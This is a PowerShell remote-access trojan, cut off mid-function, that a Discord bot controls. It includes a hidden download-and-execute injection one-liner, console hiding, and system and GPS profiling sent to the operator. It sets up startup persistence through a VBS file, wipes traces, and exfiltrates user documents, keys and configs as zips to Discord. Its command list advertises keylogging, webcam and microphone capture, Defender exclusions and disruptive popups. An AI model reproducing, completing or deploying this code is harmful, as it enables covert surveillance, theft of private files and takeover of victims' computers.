# Discord C2 Client
# A PowerShell script for remote control via a Discord bot
# Setup Instructions:
# 1. Create a Discord bot at https://discord.com/developers/applications/
# 2. Enable all Privileged Gateway Intents on the 'Bot' page
# 3. On OAuth2 page, select 'Bot' in Scopes and permissions: Manage Channels, Read Messages/View Channels, Attach Files, Read Message History
# 4. Copy the generated URL, open in a browser, and add the bot to a single server
# 5. Reset and copy the bot token, then set it in the $global:token variable
# Note: The bot must be in ONE server only
# Injection Method (unchanged): powershell -NoP -Ep Bypass -W H -C $ch = 'channel_id'; $tk = 'bot_token'; irm https://is.gd/M1Ul40 | iex

# Configuration
$global:token = "$tk" # Discord bot token (replace with your token)
$global:parent = "https://is.gd/y92xe4" # Parent script URL for persistence
$HideConsole = 1 # 1 to hide console window
$spawnChannels = 1 # 1 to create new channels on session start
$InfoOnConnect = 1 # 1 to send client info on connect
$defaultstart = 1 # 1 to start all jobs automatically
$version = "1.5.1" # Script version
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# Global Variables
$global:CategoryID = $null
$global:SessionID = $null
$global:ch = $null
$global:ScreenshotID = $null
$global:WebcamID = $null
$global:MicrophoneID = $null
$global:keyID = $null
$global:LootID = $null
$global:PowershellID = $null
$global:botId = $null
$global:latestMessageContent = $null
$global:jsonPayload = $null

# Remove existing persistence if present
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
}

# Core Functions
function Send-Message {
    param (
        [string]$Message,
        [string]$ChannelID = $global:SessionID,
        [string]$Embed
    )
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:token")
        $wc.Headers.Add("Content-Type", "application/json")
        if ($Embed) {
            $jsonBody = $global:jsonPayload | ConvertTo-Json -Depth 10 -Compress
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
            $global:jsonPayload = $null
        }
        if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

function Send-File {
    param (
        [string]$FilePath,
        [string]$ChannelID = $global:SessionID
    )
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:token")
        if ($FilePath -and (Test-Path $FilePath -PathType Leaf)) {
            $wc.UploadFile($url, "POST", $FilePath) | Out-Null
            Write-Host "Attachment sent to Discord: $FilePath"
        } else {
            Write-Host "File not found: $FilePath"
        }
    } catch {
        Write-Host "Failed to send file to Discord: $_"
    }
}

function Get-Ffmpeg {
    try {
        Send-Message -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
        $Path = "$env:Temp\ffmpeg.exe"
        $tempDir = "$env:temp"
        if (!(Test-Path $Path)) {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "PowerShell")
            $response = $wc.DownloadString($apiUrl)
            $release = $response | ConvertFrom-Json
            $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $zipUrl = $asset.browser_download_url
            $zipFilePath = Join-Path $tempDir $asset.name
            $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
            $wc.DownloadFile($zipUrl, $zipFilePath)
            Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
            Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
            Remove-Item -Path $zipFilePath -Force
            Remove-Item -Path $extractedDir -Recurse -Force
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``Failed to download FFmpeg: $_`` :octagonal_sign:"
    }
}

function New-ChannelCategory {
    try {
        $headers = @{ 'Authorization' = "Bot $global:token" }
        $guildID = $null
        while (!$guildID) {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", $headers.Authorization)
            $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
            $guilds = $response | ConvertFrom-Json
            $guildID = $guilds[0].id
            Start-Sleep -Seconds 3
        }
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
        $body = @{
            "name" = "$env:COMPUTERNAME"
            "type" = 4
        } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:token")
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:CategoryID = $responseObj.id
        Write-Host "The ID of the new category is: $($responseObj.id)"
    } catch {
        Write-Host "Failed to create channel category: $_"
    }
}

function New-Channel {
    param ([string]$Name)
    try {
        $headers = @{ 'Authorization' = "Bot $global:token" }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $body = @{
            "name" = "$Name"
            "type" = 0
            "parent_id" = $global:CategoryID
        } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:token")
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:ChannelID = $responseObj.id
        Write-Host "The ID of the new channel is: $($responseObj.id)"
    } catch {
        Write-Host "Failed to create channel: $_"
    }
}

# System Info Functions
function Quick-Info {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
        if ($GeoWatcher.Permission -eq 'Denied') {
            $GPS = "Location Services Off"
        } else {
            $GL = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$"
            $GPS = "LAT = $Lat LONG = $Lon"
        }
        $adminperm = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) { "True" } else { "False" }
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $videocardinfo = Get-WmiObject Win32_VideoController
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $screensize = "$($Screen.Width) x $($Screen.Height)"
        $email = (Get-ComputerInfo).WindowsRegisteredOwner
        $OSString = "$($systemInfo.Caption)"
        $OSArch = "$($systemInfo.OSArchitecture)"
        $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
        $processor = "$($processorInfo.Name)"
        $gpu = "$($videocardinfo.Name)"
        $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
        $systemLanguage = (Get-WinSystemLocale).Name
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

        $global:jsonPayload = @{
            username = $env:COMPUTERNAME
            tts = $false
            embeds = @(
                @{
                    title = "$env:COMPUTERNAME | Computer Information"
                    description = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Options**               : Show The Options Menu
- **ExtraInfo**             : Show The Extra Info Menu
- **Close**                 : Close this session
"@
                    color = 65280
                }
            )
        }
        Send-Message -Embed $true
    } catch {
        Send-Message -Message ":octagonal_sign: ``Failed to gather quick info: $_`` :octagonal_sign:"
    }
}

function Hide-Window {
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
        } else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    } catch {
        Write-Host "Failed to hide window: $_"
    }
}

# Help Functions
function Show-Options {
    $global:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts = $false
        embeds = @(
            @{
                title = "$env:COMPUTERNAME | Commands List"
                description = @"
### SYSTEM
- **AddPersistance**: Add this script to startup
- **RemovePersistance**: Remove script from startup
- **IsAdmin**: Check if session is admin
- **Elevate**: Attempt to restart as admin (triggers UAC)
- **ExcludeCDrive**: Exclude C:/ from Defender scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ from Defender scans
- **EnableIO**: Enable keyboard and mouse (admin only)
- **DisableIO**: Disable keyboard and mouse (admin only)
- **Exfiltrate**: Send files (see ExtraInfo)
- **Upload**: Upload a file (see ExtraInfo)
- **Download**: Download a file (attach with command)
- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
- **SpeechToText**: Send audio transcript to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby WiFi networks (triggers UAC)
- **RecordScreen**: Record screen and send to Discord

### PRANKS
- **FakeUpdate**: Spoof Windows-10 update screen
- **Windows93**: Start parody Windows93
- **WindowsIdiot**: Start fake Windows95
- **SendHydra**: Never-ending popups (use kill to stop)
- **SoundSpam**: Play all Windows default sounds
- **Message**: Send a message popup to user
- **VoiceMessage**: Send a voice message to user
- **MinimizeAll**: Minimize all windows
- **EnableDarkMode**: Enable system-wide dark mode
- **DisableDarkMode**: Disable system-wide dark mode
- **ShortcutBomb**: Create 50 shortcuts on desktop
- **Wallpaper**: Set wallpaper `wallpaper -url http://img.com/f4wc`
- **Goose**: Spawn annoying goose
- **ScreenParty**: Start a disco on screen

### JOBS
- **Microphone**: Record microphone clips
- **Webcam**: Stream webcam pictures
- **Screenshots**: Send desktop screenshots
- **Keycapture**: Capture keystrokes
- **SystemInfo**: Gather system info

### CONTROL
- **ExtraInfo**: Get further info and command examples
- **Cleanup**: Wipe history (run prompt, PowerShell, recycle bin, temp)
- **Kill**: Stop a running module (e.g., Exfiltrate)
- **PauseJobs**: Pause current jobs
- **ResumeJobs**: Resume all jobs
- **Close**: Close session
"@
                color = 65280
            }
        )
    }
    Send-Message -Embed $true
}

function Show-ExtraInfo {
    $global:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts = $false
        embeds = @(
            @{
                title = "$env:COMPUTERNAME | Extra Information"
                description = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns PowerShell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN Example:**
> PS> ``EnumerateLAN -Prefix 192.168.1.``
This Eg. will scan 192.168.1.1 to 192.168.1.254

**Prank Examples:**
> PS> ``Message 'Your Message Here!'``
> PS> ``VoiceMessage 'Your Message Here!'``
> PS> ``wallpaper -url http://img.com/f4wc``

**Record Examples:**
> PS> ``RecordScreen -t 100`` (number of seconds to record)

**Kill Command modules:**
- Exfiltrate
- SendHydra
- SpeechToText
"@
                color = 65280
            }
        )
    }
    Send-Message -Embed $true
}

function Clean-Up {
    try {
        Remove-Item $env:temp\* -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
        $paths = @("$env:Temp\Image.jpg", "$env:Temp\Screen.jpg", "$env:Temp\Audio.mp3")
        foreach ($path in $paths) {
            if (Test-Path $path) { Remove-Item $path -Force }
        }
        Send-Message -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Cleanup failed: $_`` :octagonal_sign:"
    }
}

# Info Functions
function Enumerate-LAN {
    try {
        Send-Message -Message ":hourglass: Searching Network Devices - please wait.. :hourglass:"
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
            $subnet = $matches[1]
            1..254 | ForEach-Object {
                Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
            }
            Start-Sleep -Seconds 1
            $IPDevices = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +',',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
            $IPDevices | ForEach-Object {
                try {
                    $ip = $_.IPv4
                    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
                } catch {
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "N/A" -Force
                }
            }
            $IPDevices = ($IPDevices | Out-String)
            Send-Message -Message "``````$IPDevices``````"
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``Failed to enumerate LAN: $_`` :octagonal_sign:"
    }
}

function Nearby-Wifi {
    try {
        $showNetworks = explorer.exe ms-availablenetworks:
        Start-Sleep -Seconds 4
        $wshell = New-Object -ComObject wscript.shell
        $wshell.AppActivate('explorer.exe')
        1..6 | ForEach-Object { $wshell.SendKeys('{TAB}'); Start-Sleep -Milliseconds 100 }
        $wshell.SendKeys('{ENTER}')
        Start-Sleep -Milliseconds 200
        $wshell.SendKeys('{TAB}')
        Start-Sleep -Milliseconds 200
        $wshell.SendKeys('{ESC}')
        $NearbyWifi = (netsh wlan show networks mode=Bssid | Where-Object { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band
        $Wifi = ($NearbyWifi | Out-String)
        Send-Message -Message "``````$Wifi``````"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Failed to enumerate WiFi: $_`` :octagonal_sign:"
    }
}

# Prank Functions
function Fake-Update {
    try {
        $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
        $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
        $tobat | Out-File -FilePath $pth -Force
        Start-Sleep -Seconds 1
        Start-Process -FilePath $pth
        Start-Sleep -Seconds 3
        Remove-Item -Path $pth -Force
        Send-Message -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Fake-Update failed: $_`` :octagonal_sign:"
    }
}

function Windows-93 {
    try {
        $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
        $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
        $tobat | Out-File -FilePath $pth -Force
        Start-Sleep -Seconds 1
        Start-Process -FilePath $pth
        Start-Sleep -Seconds 3
        Remove-Item -Path $pth -Force
        Send-Message -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Windows 93 failed: $_`` :octagonal_sign:"
    }
}

function Windows-Idiot {
    try {
        $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
        $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
        $tobat | Out-File -FilePath $pth -Force
        Start-Sleep -Seconds 1
        Start-Process -FilePath $pth
        Start-Sleep -Seconds 3
        Remove-Item -Path $pth -Force
        Send-Message -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Windows Idiot failed: $_`` :octagonal_sign:"
    }
}

function Send-Hydra {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Send-Message -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
        function Create-Form {
            $form = New-Object Windows.Forms.Form
            $form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ "
            $form.Font = 'Microsoft Sans Serif,12,style=Bold'
            $form.Size = New-Object Drawing.Size(300, 170)
            $form.StartPosition = 'Manual'
            $form.BackColor = [System.Drawing.Color]::Black
            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
            $form.ControlBox = $false
            $form.ForeColor = "#FF0000"
            $Text = New-Object Windows.Forms.Label
            $Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear"
            $Text.Font = 'Microsoft Sans Serif,14'
            $Text.AutoSize = $true
            $Text.Location = New-Object System.Drawing.Point(15, 20)
            $Close = New-Object Windows.Forms.Button
            $Close.Text = "Close?"
            $Close.Width = 120
            $Close.Height = 35
            $Close.BackColor = [System.Drawing.Color]::White
            $Close.ForeColor = [System.Drawing.Color]::Black
            $Close.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $Close.Location = New-Object System.Drawing.Point(85, 100)
            $form.Controls.AddRange(@($Text, $Close))
            return $form
        }
        while ($true) {
            $form = Create-Form
            $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $result = $form.ShowDialog()
            $messages = Pull-Message
            if ($messages -match "kill") {
                Send-Message -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
                break
            }
            if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
                $form2 = Create-Form
                $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
                $form2.Show()
            }
            Start-Sleep -Seconds (Get-Random -Minimum 0 -Maximum 2)
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``Hydra failed: $_`` :octagonal_sign:"
    }
}

function Send-MessagePopup {
    param ([string]$Message)
    try {
        msg.exe * $Message
        Send-Message -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Message popup failed: $_`` :octagonal_sign:"
    }
}

function Sound-Spam {
    param ([int]$Interval = 3)
    try {
        Send-Message -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
        Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | ForEach-Object {
            Start-Sleep -Seconds $Interval
            (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$($_.Name)").Play()
        }
        Send-Message -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Sound spam failed: $_`` :octagonal_sign:"
    }
}

function Voice-Message {
    param ([string]$Message)
    try {
        Add-Type -AssemblyName System.Speech
        $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $SpeechSynth.Speak($Message)
        Send-Message -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Voice message failed: $_`` :octagonal_sign:"
    }
}

function Minimize-All {
    try {
        $apps = New-Object -ComObject Shell.Application
        $apps.MinimizeAll()
        Send-Message -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Minimize all failed: $_`` :octagonal_sign:"
    }
}

function Enable-DarkMode {
    try {
        $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
        Set-ItemProperty $Theme AppsUseLightTheme -Value 0
        Set-ItemProperty $Theme SystemUsesLightTheme -Value 0
        Start-Sleep -Seconds 1
        Send-Message -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Enable dark mode failed: $_`` :octagonal_sign:"
    }
}

function Disable-DarkMode {
    try {
        $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
        Set-ItemProperty $Theme AppsUseLightTheme -Value 1
        Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
        Start-Sleep -Seconds 1
        Send-Message -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Disable dark mode failed: $_`` :octagonal_sign:"
    }
}

function Shortcut-Bomb {
    try {
        $n = 0
        while ($n -lt 50) {
            $num = Get-Random
            $AppLocation = "C:\Windows\System32\rundll32.exe"
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware$num.lnk")
            $Shortcut.TargetPath = $AppLocation
            $Shortcut.Arguments = "shell32.dll,Control_RunDLL hotplug.dll"
            $Shortcut.IconLocation = "hotplug.dll,0"
            $Shortcut.Description = "Device Removal"
            $Shortcut.WorkingDirectory = "C:\Windows\System32"
            $Shortcut.Save()
            Start-Sleep -Milliseconds 200
            $n++
        }
        Send-Message -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Shortcut bomb failed: $_`` :octagonal_sign:"
    }
}

function Set-Wallpaper {
    param ([string[]]$url)
    try {
        $outputPath = "$env:temp\img.jpg"
        $wallpaperStyle = 2
        Invoke-WebRequest -Uri $url -OutFile $outputPath
        $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
        Add-Type -TypeDefinition $signature
        $SPI_SETDESKWALLPAPER = 0x0014
        $SPIF_UPDATEINIFILE = 0x01
        $SPIF_SENDCHANGE = 0x02
        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
        Send-Message -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Wallpaper set failed: $_`` :octagonal_sign:"
    }
}

function Spawn-Goose {
    try {
        $url = "https://github.com/wormserv/assets/raw/main/Goose.zip"
        $tempFolder = $env:TMP
        $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
        $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
        Invoke-WebRequest -Uri $url -OutFile $zipFile
        Expand-Archive -Path $zipFile -DestinationPath $extractPath
        $vbscript = "$extractPath\Goose.vbs"
        & $vbscript
        Send-Message -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Goose spawn failed: $_`` :octagonal_sign:"
    }
}

function Screen-Party {
    try {
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
        Send-Message -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Screen party failed: $_`` :octagonal_sign:"
    }
}

# Persistence Functions
function Add-Persistence {
    try {
        $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
        $scriptContent = Invoke-WebRequest -Uri $global:parent -UseBasicParsing
        $scriptContent.Content | Out-File -FilePath $newScriptPath -Force
        "`$tk = `"$global:token`"" | Out-File -FilePath $newScriptPath -Force -Append
        "`$ch = `"$global:ch`"" | Out-File -FilePath $newScriptPath -Force -Append
        $tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
        $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
        $tobat | Out-File -FilePath $pth -Force
        Send-Message -Message ":white_check_mark: ``Persistence Added!`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Persistence failed: $_`` :octagonal_sign:"
    }
}

function Remove-Persistence {
    try {
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1" -Force -ErrorAction SilentlyContinue
        Send-Message -Message ":octagonal_sign: ``Persistence Removed!`` :octagonal_sign:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Remove persistence failed: $_`` :octagonal_sign:"
    }
}

# User Functions
function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)
    try {
        Send-Message -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
        $maxZipFileSize = 10MB
        $currentZipSize = 0
        $index = 1
        $zipFilePath = "$env:temp/Loot$index.zip"
        $foldersToSearch = if ($Path) { "$env:USERPROFILE\$Path" } else { @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos") }
        $fileExtensions = if ($FileType) { "*.$FileType" } else { @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft") }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
        foreach ($folder in $foldersToSearch) {
            foreach ($extension in $fileExtensions) {
                $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $fileSize = $file.Length
                    if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                        $zipArchive.Dispose()
                        Send-File -FilePath $zipFilePath
                        Start-Sleep -Seconds 1
                        Remove-Item -Path $zipFilePath -Force
                        $index++
                        $zipFilePath = "$env:temp/Loot$index.zip"
                        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                        $currentZipSize = 0
                    }
                    $entryName = $file.FullName.Substring($folder.Length + 1)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                    $currentZipSize += $fileSize
                    $messages = Pull-Message
                    if ($messages -like "kill") {
                        Send-Message -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                        $zipArchive.Dispose()
                        Remove-Item -Path $zipFilePath -Force
                        return
                    }
                }
            }
        }
        $zipArchive.Dispose()
        Send-File -FilePath $zipFilePath
        Start-Sleep -Seconds 5
        Remove-Item -Path $zipFilePath -Force
    } catch {
        Send-Message -Message ":octagonal_sign: ``Exfiltration failed: $_`` :octagonal_sign:"
    }
}

function Upload-File {
    param ([string[]]$Path)
    try {
        if (Test-Path -Path $Path) {
            $extension = [System.IO.Path]::GetExtension($Path)
            if ($extension -eq ".exe" -or $extension -eq ".msi") {
